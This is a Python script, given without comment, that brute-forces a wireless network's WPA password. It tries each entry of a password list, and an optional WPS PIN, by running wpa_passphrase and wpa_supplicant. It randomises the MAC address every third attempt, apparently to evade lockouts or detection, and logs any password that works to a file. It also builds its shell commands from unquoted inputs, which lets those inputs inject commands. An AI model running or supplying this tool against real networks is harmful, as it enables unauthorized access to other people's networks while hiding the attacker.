from sys import argv
from datetime import datetime
from time import sleep
from random import random
from subprocess import run, call, Popen, PIPE

WLAN = argv[1]
ESSID = argv[2]
DEFAULT_PASSWORD = argv[3]
PATH = argv[4]
WPSPIN = int(argv[5])
MSG = ('negotiation completed', 'Handshake failed')
RED = '\033[31m'
GREEN = '\033[32m'
BACKGROUND = '\033[33m\033[1m'
COLOUR = '\033[0m'


def get_passwords() -> list:
    with open(DEFAULT_PASSWORD, 'r') as text:
        passwords = text.read().split('\n')
    return passwords


def set_new_mac() -> str:
    source = list(map(lambda x: "%02x".upper() % int(random() * 0xFF), range(5)))
    new_mac = "00:" + ':'.join(source)
    return new_mac


def change_mac() -> None:
    mac = set_new_mac()
    cmd = [f"ip link set dev {WLAN} down",
           f"ip link set dev {WLAN} address {mac}",
           f"ip link set dev {WLAN} up"]
    [call(i, shell=True) for i in cmd]


def write_echo(passwd: str) -> str:
    time = datetime.now().strftime('%y-%m-%d %H:%M:%S')
    echo = (f'echo "[{time}] [essid: {ESSID}] [password: {passwd}"] '
            f'>> {PATH}/password.txt')
    return echo


def popen(cmd: list, secret: str) -> str:
    message = ''
    with Popen(cmd, stdout=PIPE) as output:
        for line in iter(output.stdout.readline, b''):
            out = line.strip().decode()
            # print(out)
            if MSG[0] in out:
                message = MSG[0]
                print(f'password: {GREEN}{secret}{COLOUR} is found')
                run(write_echo(secret), shell=True)
                output.kill()
                break
            elif MSG[1] in out:
                message = MSG[1]
                print(f'password: {RED}{secret}{COLOUR} is wrong')
                output.kill()
                break
    return message


def brute() -> None:
    print(f'Current AP: {BACKGROUND}{ESSID}{COLOUR}')
    passwords: list = get_passwords()
    if WPSPIN:
        passwords.insert(0, WPSPIN)
    for password in passwords:
        if passwords.index(password) % 3 == 0:
            change_mac()
        passphrase = f"wpa_passphrase '{ESSID}' {password} > '{PATH}/{ESSID}.conf'"
        run(passphrase, shell=True)
        supplicant = ["wpa_supplicant", "-i", f"{WLAN}", "-c", f"{PATH}/{ESSID}.conf"]
        if popen(supplicant, password) == MSG[0]:
            sleep(5)
            break


if __name__ == '__main__':
    brute()
